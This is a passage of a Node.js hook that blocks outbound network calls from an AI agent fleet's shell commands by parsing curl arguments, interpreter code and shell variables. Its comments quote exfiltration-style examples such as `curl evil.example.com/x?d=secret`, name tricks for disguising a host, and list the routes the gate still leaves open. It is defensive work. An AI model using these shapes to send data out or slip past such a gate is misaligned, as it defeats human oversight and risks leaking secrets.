#!/usr/bin/env node
// PreToolUse hook (Bash): blocks the NAMED egress shapes the command-name deny list lets through.
// EGRESSPARSER923, owner GO for scope (a) only (2026-09-23).
//
// The deny list (agent-scaffold.ts, BASH_EGRESS_DENY) matches COMMAND NAMES with globs and has no
// negation, so it cannot say "any http EXCEPT localhost". Its own comment names what passes:
// plain-http external fetches, interpreter one-liners (python3 -c, node -e), and a URL hidden in a
// shell variable. This hook closes exactly those three shapes by PARSING the command:
//   1. curl to an EXTERNAL destination: a scheme-bearing URL (http:// included, which the deny list
//      cannot cover), and any positional / --url / proxy argument even WITHOUT a scheme;
//   2. an interpreter one-liner (python/node/perl/ruby/php/deno/bun with -c/-e/-r/--eval) whose code
//      carries an EXTERNAL URL;
//   3. either of the above when the URL sits in a variable ASSIGNED IN THE SAME COMMAND.
// localhost / 127.0.0.1 / [::1] ALWAYS pass: the dashboard's own calls (memory, kanban, message
// queue, approvals) go over http://localhost and a gate that cut them would silence the fleet.
// Hosts are cut with a regex, not URL(), so http://localhost:$PORT stays local, while
// localhost.evil.com and localhost@evil.com are external.
//
// PRIVATE NETWORK (maintainer decision on #1611, 2026-09-27): agents may reach private network
// targets from the shell. Local, besides the loopback names above, is decided by the LITERAL host
// string only, never by DNS: a canonical dotted-quad IPv4 in 10/8, 172.16/12, 192.168/16 or 127/8, a
// bracketed IPv6 in fc00::/7 (ULA) or fe80::/10 (link-local), or a name whose LAST label is `local`
// (mDNS, e.g. nas.local). A public name that happens to resolve to a private address stays external
// (nas.example.com), and so does every IPv4 spelling a resolver reads differently from how it looks
// (0x0a.0.0.1, 012.0.0.1, 167772161, 10.1) -- fail closed. 169.254/16 is deliberately NOT local:
// it carries the cloud instance-metadata endpoint. 100.64/10 (CGNAT) is not RFC 1918 and stays
// external. A single-label name (nas, xlocal) is external too: the resolver may complete it through
// a search domain to anywhere.
//
// HOW IT READS THE COMMAND: structure from the MASKED text (maskInertLiterals blanks quoted strings
// and heredoc bodies, length-preserving), so a `curl` or `;` inside a quoted argument or a heredoc
// is not a command; the URL from the ORIGINAL text of the same span.
//
// WHAT THIS DOES NOT CLOSE -- said here so nobody reads "merged" as "closed" (owner/Marveen 29047):
// the name-and-shape list will never be complete. Since (d) (card 95800e1d) a heredoc-fed interpreter
// (`python3 - <<'PY'`, `bash <<EOF`) and a script file an interpreter runs (`python3 x.py`, `bash x.sh`)
// are judged too, by the network call's literal destination (see section (d) above classify). Since (e)
// (card c83a6bf6) the command behind a launcher, inside a command string (a shell's -c, eval, a launcher's
// command option), in a sourced file or piped into an interpreter, the script a project runner runs, the
// destinations of the named clients (wget, nc, ncat, telnet, socat, httpie, aria2c), a URL handed to judged
// code through an assignment in the same command, and the local modules judged code imports are judged too
// (section (e)). Still open: a destination that is not a literal (a file, the environment set elsewhere, a
// function parameter, a templated host, a previous command, a curl -K config, a substitution such as
// `curl $(echo https://x)`); a launcher the table does not name; a command string nested deeper than the
// depth limit; a module that is not a local file; every other network-capable binary (git, pip, npm, ssh,
// scp, rsync, dig ...).
// Closing those is direction (b): an allowlist / network-level gate, not this hook.
//
// Fail-open on unparseable input or an internal error (logged): a crashed gate must not silence the
// fleet; that is today's behaviour, not a new hole. Every DENY is appended to the block log.
import { readFileSync, appendFileSync, realpathSync, mkdirSync, existsSync, statSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, join, resolve, isAbsolute } from 'node:path'
import { homedir } from 'node:os'
import { maskInertLiterals } from '../self-pace-gate.mjs'

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..')
export const BLOCK_LOG = process.env.BASH_EGRESS_BLOCK_LOG || join(ROOT, 'store', 'bash-egress-blocks.jsonl')
// EGRESSVENDOR925: vendor-API hosts a Bash call may reach (owner decision, per install).
// store/egress-vendor-hosts.json = { "hosts": ["api.elevenlabs.io"] }. EXACT host match only:
// no wildcard, no suffix match, no subdomain inheritance -- `elevenlabs.io.evil.com` and
// `x.api.elevenlabs.io` are other hosts. A missing or unreadable file, or an entry that is not
// a plain DNS name, means no exception: today's behaviour (deny). This is NOT
// store/egress-allowlist.json -- that one is the WebFetch / quarantine-reader list.
export const VENDOR_HOSTS_PATH = process.env.BASH_EGRESS_VENDOR_HOSTS || join(ROOT, 'store', 'egress-vendor-hosts.json')
// A plain DNS name: labels of [a-z0-9-], no leading/trailing hyphen, at least one dot, a letter TLD.
// Not an IP, not localhost, no `*`, no leading dot, no port, no userinfo.
const VENDOR_HOST = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$/
export function parseVendorHosts(raw) {
  const list = raw && typeof raw === 'object' && Array.isArray(raw.hosts) ? raw.hosts : []
  return new Set(list.filter((h) => typeof h === 'string' && VENDOR_HOST.test(h)))
}
export function loadVendorHosts(path = VENDOR_HOSTS_PATH) {
  try { return parseVendorHosts(JSON.parse(readFileSync(path, 'utf-8'))) } catch { return new Set() }
}
// OPTIONAL, opt-in (#1611, a policy proposal): the same file may also carry
// `"domains": ["example.com"]` -- a listed domain OR any subdomain of it passes. The match is on a
// LABEL boundary: `api.example.com` matches `example.com`, while `evilexample.com`,
// `example.com.evil.net` and `example.com@evil.net` (whose host is evil.net) do not. Entries are
// shape-checked exactly like "hosts" (a plain DNS name: no wildcard, no leading dot, no IP, no
// port, no userinfo), so an IP or `*.x` can never widen the list. A missing key, a malformed
// file, or an entry that is not a plain DNS name adds nothing: today's behaviour. Kept separate
// from "hosts" on purpose, so an existing exact entry never silently becomes a suffix rule.
export function parseVendorDomains(raw) {
  const list = raw && typeof raw === 'object' && Array.isArray(raw.domains) ? raw.domains : []
  return new Set(list.filter((h) => typeof h === 'string' && VENDOR_HOST.test(h)))
}
export function loadVendorDomains(path = VENDOR_HOSTS_PATH) {
  try { return parseVendorDomains(JSON.parse(readFileSync(path, 'utf-8'))) } catch { return new Set() }
}
export function hostInDomains(host, domains) {
  for (const d of domains) if (host === d || host.endsWith(`.${d}`)) return true
  return false
}
const LOCAL_HOSTS = new Set(['localhost', '127.0.0.1', '[::1]', '::1'])
// One-liner URL schemes: every network scheme libcurl speaks (minus file:, and ipfs:/ipns:, which
// resolve through a gateway, not the literal host). A one-liner reaches all of them through a curl
// binding (PHP curl_exec, pycurl) or a stream wrapper (PHP ftps://, Perl LWP gopher://), so an
// http/ftp-only list let `php -r '...curl_init("sftp://host/")...curl_exec(...)'` out untouched.
const URL_RE = /\b(?:https?|ftps?|sftp|scp|tftp|smbs?|dict|gophers?|imaps?|pop3s?|smtps?|ldaps?|telnet|mqtt|rtsp):\/\/[^\s'"`<>\\)]+/gi
const INTERPRETER = /^(?:python(?:\d+(?:\.\d+)?)?|node(?:js)?|perl|ruby|php|deno|bun)$/
const CODE_FLAG = new Set(['-c', '-e', '-E', '-r', '--eval', '-p', '--print', 'eval'])
// Words that can stand before the real command word of a sub-command. The shell keywords are here
// because `for p in a b; do curl ...` splits at `;` into a span that starts with `do`, and without
// them a curl inside a loop or an if/then body was never looked at.
const PREFIX_WORDS = new Set(['env', 'sudo', 'command', 'exec', 'time', 'nohup', 'nice',
  'do', 'then', 'else', 'elif', '{', '(', '!'])
// A one-liner is a DOWNLOADER only when its code uses a network primitive of the language itself.
// Measured on 7 days of fleet commands: a one-liner that merely CARRIES a URL as data (an
// inter-agent message built with subprocess + curl to localhost) must not be denied -- that was 4 of
// 10 would-be blocks. Browser automation (chromium / playwright / puppeteer) is deliberately NOT in
// this list: it is the fleet's mandated browser-verify path on its own domains, and an own-domain
// allowlist is direction (b). Stated as open, measured, and left to the owner.
const NET_PRIMITIVE = /\b(?:urllib|requests\.|http\.client|httplib|httpx|aiohttp|urlopen|socket\.|fetch\s*\(|https?\.(?:get|request)\s*\(|axios|node-fetch|undici|got\s*\(|LWP::|HTTP::Tiny|Net::HTTP|open-uri|IO::Socket|file_get_contents|curl_exec|Invoke-WebRequest)|-M(?:LWP|HTTP::Tiny|IO::Socket|Net::HTTP)/

export function hostOf(url) {
  const m = /^[a-z][a-z0-9+.-]*:\/\/(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/i.exec(url)
  return m ? m[1].toLowerCase() : null
}
// Canonical dotted-quad only: no leading zero, no hex/octal/decimal/short forms.
const OCTET = '(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)'
const CANON_IPV4 = new RegExp(`^${OCTET}(?:\\.${OCTET}){3}$`)
const MDNS_NAME = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+local$/
// A private-network target by its literal spelling (see the PRIVATE NETWORK note in the header).
export function isPrivateTarget(host) {
  const h = String(host ?? '').toLowerCase()
  if (CANON_IPV4.test(h)) {
    const [a, b] = h.split('.').map(Number)
    return a === 10 || a === 127 || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168)
  }
  const v6 = /^\[([0-9a-f:.]+)\]$/.exec(h)
  if (v6) return /^f[cd][0-9a-f]{0,2}:/.test(v6[1]) || /^fe[89ab][0-9a-f]?:/.test(v6[1])
  return MDNS_NAME.test(h)
}
export function isLocalHost(host) { return LOCAL_HOSTS.has(host) || isPrivateTarget(host) }
export function isExternal(url) {
  const h = hostOf(url)
  if (h === null || h === '') return false
  return !isLocalHost(h)
}
function spans(masked) {
  const out = []; let start = 0; let op = null
  const re = /&&|\|\||;|\||\n/g; let m
  while ((m = re.exec(masked))) { out.push([start, m.index, op]); op = m[0]; start = m.index + m[0].length }
  out.push([start, masked.length, op])
  return out
}
function words(s) { return s.trim().split(/\s+/).filter(Boolean) }
function collectAssignments(orig, masked) {
  const env = {}
  for (const [a, b] of spans(masked)) {
    const seg = orig.slice(a, b)
    for (const m of seg.matchAll(/(?:^|\s)(?:export\s+|local\s+|readonly\s+)?([A-Za-z_][A-Za-z0-9_]*)=("([^"]*)"|'([^']*)'|([^\s]*))/g)) {
      env[m[1]] = m[3] ?? m[4] ?? m[5] ?? ''
    }
  }
  return env
}
// `for NAME in w1 w2 ...`: the loop variable takes EACH value in turn.
// NAME=value alone never saw it, so `for u in https://x ...; do curl "$u"; done` reached curl with an
// unread destination and passed, while the same URL as a literal or a plain assignment was denied.
// The keyword is found in the MASKED text (a quoted "for u in" is not a loop), the values are read
// from the ORIGINAL text, unquoted, with this command's assignments expanded in them.
function collectLoops(orig, masked, env) {
  const loops = {}
  for (const [a, b] of spans(masked)) {
    const m = /(?:^|[\s(!{])for\s+([A-Za-z_][A-Za-z0-9_]*)\s+in(?=\s|$)/.exec(masked.slice(a, b))
    if (!m) continue
    const vals = shellWords(expand(orig.slice(a + m.index + m[0].length, b), env))
    loops[m[1]] = [...(loops[m[1]] ?? []), ...vals]
  }
  return loops
}
// Every reading of a span a loop can produce: one text per loop value (per combination, for nested
// loops). Past MAX_LOOP_VARIANTS the span is not judged value by value: null, and the caller fails
// closed -- a hand-written URL loop is a few values, never hundreds.
const MAX_LOOP_VARIANTS = 64
// A value goes into the text as ONE word: pasting `'{"a":"b c"}'` raw broke the command's own
// quoting, and its fragments were read as hosts (measured on the fleet's week of commands: a loop
// of JSON bodies posted to localhost with -d "$p" was denied). A URL never holds whitespace or a
// quote, so such a value is replaced by the first URL inside it, or by a neutral word.
function asWord(value) {
  if (/^[^\s'"`\\]+$/.test(value)) return value
  return (String(value).match(URL_RE) ?? [])[0] ?? 'x'
}
function loopVariants(text, env, loops) {
  let out = [text]
  for (const [v, vals] of Object.entries(loops)) {
    const re = new RegExp(`\\$\\{${v}\\}|\\$${v}(?![A-Za-z0-9_])`, 'g')
    if (!re.test(text)) continue
    re.lastIndex = 0
    out = out.flatMap((t) => vals.map((x) => t.replace(re, () => asWord(x))))
    if (out.length > MAX_LOOP_VARIANTS) return null
  }
  return out.map((t) => expand(t, env))
}
function expand(text, env) {
  return text.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)/g, (all, a, b) => (env[a ?? b] ?? all))
}
// $( ... ) and backtick substitutions are commands of their own: lift them out (length-preserving,
// so offsets still align), classify each inner command separately, and parse the rest without them.
// Without this, every `-H "Authorization: Bearer $(cat token)"` made maskInertLiterals give up:
// measured, 32% of fleet commands were unparseable and would have been allowed blind.
// Quote-aware, with the SAME rules as maskInertLiterals: a substitution is lifted only where the
// shell would run it (top level, inside "...", inside an unquoted-tag heredoc body). Inside '...',
// $'...' and a quoted-tag heredoc body it is inert text. Lifting it there turned every HANDOFF.md
// written with `cat > f <<'EOF'` that mentions a curl in backticks into a false deny.
function substEnd(text, i) { // text[i..] starts with $( -> index just past the matching )
  let depth = 1, j = i + 2, q = null
  while (j < text.length && depth > 0) {
    const c = text[j]
    if (q) { if (c === q) q = null; else if (c === '\\' && q === '"') j++ }
    else if (c === "'" || c === '"') q = c
    else if (c === '(') depth++
    else if (c === ')') depth--
    j++
  }
  return j
}
function backtickEnd(text, i) { // text[i] is ` -> index just past the closing `
  let j = i + 1
  while (j < text.length && text[j] !== '`') j += text[j] === '\\' ? 2 : 1
  return Math.min(j + 1, text.length)
}
export function liftSubstitutions(text) {
  const inners = []; let out = ''; let i = 0
  // A live substitution at `at` is lifted (blanked, inner kept); returns the next index or -1.
  const lift = (at) => {
    if (text[at] === '$' && text[at + 1] === '(') {
      const j = substEnd(text, at)
      inners.push(text.slice(at + 2, j - 1)); out += ' '.repeat(j - at); return j
    }
    if (text[at] === '`') {
      const j = backtickEnd(text, at)
      inners.push(text.slice(at + 1, j - 1)); out += ' '.repeat(j - at); return j
    }
    return -1
  }
  // Copy [from, to) in a live context (double quotes, unquoted heredoc body). An escaped \` or \$
  // is literal text here, but maskInertLiterals gives up on ANY backtick or $( inside "...", so it is
  // blanked (length-preserving): measured, 58 of 78 unparseable fleet commands were exactly this
  // (a `gh pr comment --body "... \`code\` ..."`).
  const copyLive = (from, to) => {
    let k = from
    while (k < to) {
      if (text[k] === '\\' && (text[k + 1] === '`' || text[k + 1] === '$')) { out += '  '; k += 2; continue }
      if (text[k] === '\\') { out += text.slice(k, Math.min(k + 2, to)); k += 2; continue }
      const n = lift(k)
      if (n !== -1) { k = n; continue }
      out += text[k]; k++
    }
  }
  while (i < text.length) {
    const c = text[i]
    if (c === '\\' && i + 1 < text.length) { out += text.slice(i, i + 2); i += 2; continue }
    // A here-string (<<<) is not a heredoc, but maskInertLiterals reads `<<<"$s"` as a heredoc
    // tagged `$s` with no body and gives up. The operator carries no URL and no command: blank it,
    // and the word after it is parsed as ordinary (quoted or live) text.
    if (text.startsWith('<<<', i)) { out += '   '; i += 3; continue }
    const here = /^<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/.exec(text.slice(i))
    if (here) {
      const tag = here[1] ?? here[2] ?? here[3]
      const quotedTag = here[1] != null || here[2] != null
      out += here[0]; i += here[0].length
      const nl = text.indexOf('\n', i)
      if (nl === -1) { copyLive(i, text.length); break }
      // the rest of the heredoc line is ordinary shell text; hand it back to the main loop
      // by processing it recursively, then continue with the body
      const lineRest = liftSubstitutions(text.slice(i, nl + 1))
      out += lineRest.stripped; inners.push(...lineRest.inners); i = nl + 1
      const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
      const rel = endRx.exec(text.slice(i))
      const bodyEnd = rel ? i + rel.index : text.length
      if (quotedTag) out += text.slice(i, bodyEnd); else copyLive(i, bodyEnd)
      i = bodyEnd
      continue
    }
    if (c === "'") {
      const end = text.indexOf("'", i + 1)
      const stop = end === -1 ? text.length : end + 1
      out += text.slice(i, stop); i = stop; continue
    }
    if (c === '$' && text[i + 1] === "'") {
      let j = i + 2
      while (j < text.length && text[j] !== "'") j += text[j] === '\\' ? 2 : 1
      const stop = Math.min(j + 1, text.length)
      out += text.slice(i, stop); i = stop; continue
    }
    if (c === '"') {
      let j = i + 1
      while (j < text.length && text[j] !== '"') {
        if (text[j] === '\\') { j += 2; continue }
        if (text[j] === '$' && text[j + 1] === '(') { j = substEnd(text, j); continue }
        if (text[j] === '`') { j = backtickEnd(text, j); continue }
        j++
      }
      out += '"'
      if (j >= text.length) { copyLive(i + 1, text.length); i = text.length; continue }
      copyLive(i + 1, j); out += '"'; i = j + 1; continue
    }
    const n = lift(i)
    if (n !== -1) { i = n; continue }
    out += c; i++
  }
  return { stripped: out, inners }
}
// curl's DESTINATION is not only a scheme-bearing URL. A positional argument is always a URL to
// curl, and with no scheme curl guesses http:// -- so `curl evil.example.com/x?d=secret` reaches
// the host while URL_RE (which needs a scheme) and the name list (`curl *https://*`) both miss it.
// So for curl the argv is read: every positional argument, the --url value, and the proxy / DoH /
// connect-to / resolve values are destinations, and a non-loopback host in any of them denies.
// Flags that take a value are skipped with their value, so `-H "Host: x.y"` or `-o out.html` is
// never read as a destination. An unknown long option is assumed to take no value: if that is
// wrong, its value is read as a destination, which errs toward a deny, never toward a pass.
const CURL_SHORT_WITH_VALUE = new Set('AbcCdDeEFHKmoPQrtTuUwxXyYz'.split(''))
const CURL_LONG_WITH_VALUE = new Set([
  'data', 'data-ascii', 'data-binary', 'data-raw', 'data-urlencode', 'json', 'form', 'form-string',
  'header', 'proxy-header', 'output', 'output-dir', 'request', 'config', 'user', 'proxy-user',
  'user-agent', 'referer', 'cookie', 'cookie-jar', 'dump-header', 'write-out', 'max-time',
  'connect-timeout', 'retry', 'retry-delay', 'retry-max-time', 'range', 'continue-at', 'cert',
  'cert-type', 'key', 'key-type', 'pass', 'cacert', 'capath', 'ciphers', 'interface', 'local-port',
  'limit-rate', 'max-filesize', 'max-redirs', 'noproxy', 'upload-file', 'time-cond', 'trace',
  'trace-ascii', 'stderr', 'unix-socket', 'abstract-unix-socket', 'oauth2-bearer', 'aws-sigv4',
  'expect100-timeout', 'keepalive-time', 'happy-eyeballs-timeout-ms', 'variable', 'url-query',
  'mail-from', 'mail-rcpt', 'mail-auth', 'hostpubmd5', 'hostpubsha256', 'pubkey', 'krb',
  'delegation', 'dns-servers', 'dns-interface', 'dns-ipv4-addr', 'dns-ipv6-addr', 'speed-limit',
  'speed-time', 'tls-max', 'proto', 'proto-redir', 'proto-default', 'etag-save', 'etag-compare',
  'parallel-max', 'create-file-mode', 'ftp-port', 'quote', 'service-name', 'sasl-authzid',
  'login-options', 'netrc-file', 'crlfile', 'engine', 'random-file', 'egd-file', 'socks5-gssapi-service',
  // destination-bearing: read below, still consumed as values
  'url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0',
  'doh-url', 'connect-to', 'resolve',
])
const CURL_DEST_URL = new Set(['url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0', 'doh-url', 'x'])
const CURL_DEST_PARTS = new Set(['connect-to', 'resolve']) // host:port:host:port / host:port:addr
const HOSTNAME = /^(?:localhost|\d{1,3}(?:\.\d{1,3}){3}|\[[0-9a-f:.]+\]|(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,})$/i

// Split a shell text into words, honouring quotes and backslashes (substitutions are already lifted).
export function shellWords(text) {
  const out = []; let cur = null; let i = 0
  const push = () => { if (cur !== null) out.push(cur); cur = null }
  while (i < text.length) {
    const c = text[i]
    if (/\s/.test(c)) { push(); i++; continue }
    cur ??= ''
    if (c === "'") { const e = text.indexOf("'", i + 1); const end = e === -1 ? text.length : e; cur += text.slice(i + 1, end); i = end + 1; continue }
    if (c === '"') {
      let j = i + 1
      while (j < text.length && text[j] !== '"') { if (text[j] === '\\' && j + 1 < text.length) { cur += text[j + 1]; j += 2; continue } cur += text[j]; j++ }
      i = j + 1; continue
    }
    if (c === '\\' && i + 1 < text.length) { cur += text[i + 1]; i += 2; continue }
    cur += c; i++
  }
  push()
  return out
}
// The host of a curl destination, scheme optional; null when the HOST is not a literal hostname
// (an unexpanded $VAR in the host, a glob, a relative path). A variable in the PATH does not hide
// the host: `curl "https://raw.githubusercontent.com/o/r/$p"` in a loop is still a known destination
// (an earlier `value.includes('$')` check let exactly that through). The scheme may be a variable
// too (`$PROTO://host`), so everything up to `://` is dropped.
export function destHost(value) {
  if (!value) return null
  const noScheme = value.replace(/^[^/?#\s]*:\/\//, '')
  const m = /^(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/.exec(noScheme)
  const h = m ? m[1].toLowerCase() : ''
  if (HOSTNAME.test(h)) return h
  // A literal host that is not a regular hostname (single label, 0x0a.0.0.1, 167772161, 10.1) is
  // still a destination curl will resolve; returning null here let it pass unchecked. Fail closed.
  // Only plain literal tokens qualify, so a $VAR, a glob or a relative path still yields null.
  return /^(?=[^.]*[a-z0-9])[a-z0-9][a-z0-9._-]*$/.test(h) ? h : null
}
// Every external destination host in a curl argv (the words AFTER `curl`).
export function curlDestinations(args) {
  const dests = []
  const addUrl = (v) => { const h = destHost(v); if (h) dests.push(h) }
  const addParts = (v) => { for (const p of String(v).split(':')) if (HOSTNAME.test(p)) dests.push(p.toLowerCase()) }
  for (let k = 0; k < args.length; k++) {
    const w = args[k]
    if (/^\d*[<>]/.test(w) || w === '&') { if (/^\d*(?:>>?|<)&?$/.test(w)) k++; continue } // redirection
    if (w === '--' ) continue
    if (w.startsWith('--')) {
      const [name, inline] = w.slice(2).split(/=(.*)/s)
      if (!CURL_LONG_WITH_VALUE.has(name)) continue
      const v = inline !== undefined ? inline : args[++k]
      if (CURL_DEST_URL.has(name)) addUrl(v)
      else if (CURL_DEST_PARTS.has(name)) addParts(v)
      continue
    }
    if (w.startsWith('-') && w.length > 1) {
      for (let q = 1; q < w.length; q++) {
        if (!CURL_SHORT_WITH_VALUE.has(w[q])) continue
        const v = q + 1 < w.length ? w.slice(q + 1) : args[++k]
        if (CURL_DEST_URL.has(w[q])) addUrl(v)
        break
      }
      continue
    }
    addUrl(w) // positional: always a URL to curl
  }
  return dests.filter((h) => !isLocalHost(h))
}
// --- (d) INTERPRETER CODE BODIES: a heredoc fed to an interpreter, a script file it runs (95800e1d) ---
// The two shapes the header listed as open and the fleet actually used: a heredoc fed to an interpreter
// (`python3 - <<'PY' ... PY`; the call that opened card 95800e1d went out this way on 2026-10-01) and a
// script FILE an interpreter runs (`python3 x.py`, `node x.mjs`, `bash x.sh`, `./x.py` with a shebang,
// `python3 < x.py`). A body is judged as CODE, not as text: its string-literal contents and comments are
// blanked first (length-preserving, the idea of maskInertLiterals applied to the language), a network
// call is looked for in what is left, and the call's FIRST argument -- where it goes -- is read from the
// original text: a literal URL (for a socket/HTTP connection: a literal host), or a name bound to one
// in the same body. A shell body (bash/sh) goes through classify itself.
// Why not the one-liner rule (a network primitive and an external URL anywhere): measured on 7 days of
// fleet commands (383 666 Bash calls), that reading, applied to the interpreter heredocs and script files,
// would deny 230 commands that pass today, most of them a URL carried as DATA (a localhost POST whose JSON
// names a link, a host name in a config list, another program's `fetch("https://...")` inside a string
// literal of a code-editing script). This destination reading denies 60 commands that pass today, each a
// real outbound call, and keeps all 188 denies of the gate before it. Its first draft also denied syntax
// checks (`bash -n x.sh`, `node --check x.mjs`); those run nothing and are left alone.
// A file that `cat > PATH <<TAG` writes in the same command is judged by that heredoc (on disk it is still
// the old content when the hook runs). A relative script path follows a literal `cd` earlier in the same
// command, else the tool call's cwd.
// NOT judged (allowed, as before): a body or file that cannot be read or is over MAX_BODY_BYTES; a
// destination that is not a literal (a templated host, a function parameter, a URL read from a file or
// the environment, two variables concatenated); `python -m module`; test runners (`node --test`), whose
// files stub the network. (The local modules a script imports and the code piped into an interpreter are
// judged since (e), see there.)
const SCRIPT_INTERPRETER = /^(?:python(?:\d+(?:\.\d+)?)?|node(?:js)?|perl|ruby|php|deno|bun|tsx|ts-node)$/
const SHELL_INTERPRETER = /^(?:bash|sh|dash|zsh|ksh)$/
export const MAX_BODY_BYTES = 1_000_000
// Per language: the flags that make the next word CODE (a one-liner, judged by the rule above, not here),
// and the options whose VALUE is the next word (so that word is not the script). `sh -e x.sh` is errexit,
// not code: the flags differ by interpreter, so one shared set would misread it.
const BODY_CODE_FLAGS = { py: ['-c'], js: ['-e', '-p', '--eval', '--print', 'eval'], pl: ['-e', '-E'], rb: ['-e'], php: ['-r'], sh: ['-c'] }
const BODY_VALUE_FLAGS = {
  py: ['-X', '-W'],
  js: ['--import', '--require', '-r', '--loader', '--experimental-loader', '--env-file', '--conditions', '--title'],
  pl: ['-M', '-I'], rb: ['-r', '-I'], php: ['-d', '-c'], sh: ['-o', '+o'],
}
// Modes that read the script but never run it (a syntax check): nothing goes out, nothing to judge. Measured on the
// fleet's week: `bash -n x.sh` and `node --check x.mjs` were the only false denies of the first (d) draft.
const BODY_NO_EXEC = { js: ['--check', '-c'], pl: ['-c'], rb: ['-c'], php: ['-l'] }
export function langOf(word) {
  const w = String(word ?? '').split('/').pop()
  if (/^python(?:\d+(?:\.\d+)?)?$/.test(w)) return 'py'
  if (/^(?:node(?:js)?|deno|bun|tsx|ts-node)$/.test(w)) return 'js'
  if (w === 'perl') return 'pl'
  if (w === 'ruby') return 'rb'
  if (w === 'php') return 'php'
  if (SHELL_INTERPRETER.test(w)) return 'sh'
  return null
}
// The language a script names on its first line: `#!/usr/bin/python3`, `#!/usr/bin/env -S node --x`.
export function shebangLang(text) {
  const m = /^#!\s*(\S+)(?:[ \t]+([^\n]*))?/.exec(String(text ?? ''))
  if (!m) return null
  let word = m[1]
  if (word.split('/').pop() === 'env') word = (m[2] ?? '').split(/\s+/).find((w) => w && !w.startsWith('-') && !w.includes('=')) ?? ''
  return langOf(word)
}
// Blank string-literal CONTENTS and comments, length-preserving, newlines kept. The quotes (and a Python
// string prefix) stay, so the caller finds where a literal argument starts and reads it from the original.
export function maskCode(text, lang) {
  const s = String(text ?? '')
  const out = s.split('')
  const blank = (from, to) => { for (let k = from; k < to && k < s.length; k++) if (out[k] !== '\n') out[k] = ' ' }
  const hashComment = lang === 'py' || lang === 'pl' || lang === 'rb' || lang === 'php'
  const slashComment = lang === 'js' || lang === 'php'
  let i = 0
  let lastSig = '' // the last code character, to tell a JS regex literal from a division
  while (i < s.length) {
    const c = s[i]
    if ((hashComment && c === '#') || (slashComment && c === '/' && s[i + 1] === '/')) {
      const e = s.indexOf('\n', i); const end = e === -1 ? s.length : e
      blank(i, end); i = end; continue
    }
    if (slashComment && c === '/' && s[i + 1] === '*') {
      const e = s.indexOf('*/', i + 2); const end = e === -1 ? s.length : e + 2
      blank(i, end); i = end; continue
    }
    if (lang === 'js' && c === '/' && (lastSig === '' || '(,=:[!&|?{};+-*%<>~^'.includes(lastSig))) {
      let j = i + 1; let inClass = false
      while (j < s.length && s[j] !== '\n') {
        if (s[j] === '\\') { j += 2; continue }
        if (s[j] === '[') inClass = true
        else if (s[j] === ']') inClass = false
        else if (s[j] === '/' && !inClass) break
        j++
      }
      blank(i + 1, j); i = j + 1; lastSig = '/'; continue
    }
    if (c === "'" || c === '"' || (c === '`' && lang === 'js')) {
      const triple = lang === 'py' && s.startsWith(c.repeat(3), i)
      const close = triple ? c.repeat(3) : c
      let j = i + close.length
      while (j < s.length) {
        if (s[j] === '\\') { j += 2; continue }
        if (s.startsWith(close, j)) break
        if (!triple && c !== '`' && s[j] === '\n') break // an unterminated one-line string ends with its line
        j++
      }
      blank(i + close.length, j); i = Math.min(j + close.length, s.length); lastSig = c; continue
    }
    if (!/\s/.test(c)) lastSig = c
    i++
  }
  return out.join('')
}
// Callees whose FIRST argument is the destination. `.get(` / `.post(` ... cover a client object (a
// requests.Session, httpx.Client, axios, got); a dict's `.get("key")` holds no scheme and is never judged.
const CALLEE = /(?:\burlopen|\bRequest|\bfetch|\bWebSocket|\bcreate_connection|\bHTTPS?Connection|\bconnect|\.(?:get|post|put|patch|delete|head|options|request|stream|ws_connect)|\baxios|\bgot)\s*\(\s*/g
// Callees whose first argument is a HOST without a scheme (http.client, socket.create_connection).
const HOST_CALLEE = /(?:create_connection|HTTPS?Connection)\s*\(\s*$/
const SCHEME = /^[a-z][a-z0-9+.-]*:\/\//i
// `NAME = "..."` / `const NAME = '...'` / `$name = "..."`: a name bound to a string literal in the body.
const BIND = /(?:^|[;\s{(,])(?:const\s+|let\s+|var\s+|my\s+|our\s+)?\$?([A-Za-z_][A-Za-z0-9_]*)\s*(?::\s*[A-Za-z_][\w.[\], ]*)?=(?![=>])\s*(?=[rRbBuUfF]{0,2}['"`])/gm
// The argument that starts at `pos` (masked and original align): a string literal, or a name.
function argAt(orig, masked, pos) {
  let k = pos
  const pre = /^(?:(?:url|uri|href)\s*=\s*)?(?:new\s+URL\s*\(\s*)?(\(\s*)?/.exec(masked.slice(k, k + 40))
  k += pre[0].length
  const tuple = pre[1] !== undefined // connect((host, port)): the first element is a host
  const lit = /^([rRbBuUfF]{0,2})(['"`])/.exec(masked.slice(k, k + 3))
  if (lit) {
    const q = k + lit[1].length
    const quote = masked[q]
    const close = masked.startsWith(quote.repeat(3), q) ? quote.repeat(3) : quote
    const end = masked.indexOf(close, q + close.length)
    if (end === -1) return null
    return { value: orig.slice(q + close.length, end), next: end + close.length, tuple }
  }
  const id = /^([A-Za-z_][A-Za-z0-9_]*)\b/.exec(masked.slice(k, k + 80))
  return id ? { ident: id[1], next: k + id[1].length, tuple } : null
}
// Every EXTERNAL destination host of the network calls in a code body (unsorted, unique).
export function codeDestinations(body, lang) {
  const orig = String(body ?? '')
  const masked = maskCode(orig, lang)
  if (masked.length !== orig.length) return []
  const bound = new Map()
  for (const m of masked.matchAll(BIND)) {
    const a = argAt(orig, masked, m.index + m[0].length)
    if (a?.value !== undefined && SCHEME.test(a.value)) bound.set(m[1], a.value)
  }
  const hosts = new Set()
  for (const m of masked.matchAll(CALLEE)) {
    let a = argAt(orig, masked, m.index + m[0].length)
